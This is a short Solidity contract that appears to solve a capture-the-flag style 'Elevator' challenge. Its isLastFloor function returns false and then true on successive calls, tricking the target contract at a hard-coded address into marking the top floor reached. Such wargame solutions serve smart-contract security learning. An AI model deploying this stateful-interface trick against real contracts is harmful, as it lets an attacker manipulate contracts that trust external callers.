// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./elevator.sol";

contract BuildingContract {

    Elevator elevator = Elevator(0x4F29Abf20daf0cA6dDFFa30A06006d0AcfC7A3b1);
    bool hackedFloor;


    function isLastFloor(uint floor) external returns (bool){
        if (hackedFloor){
            return true;
        } else {
            hackedFloor = true;
            return false;
        }
    }

    function hack(uint _floor) external {
        elevator.goTo(_floor);
    }
  
}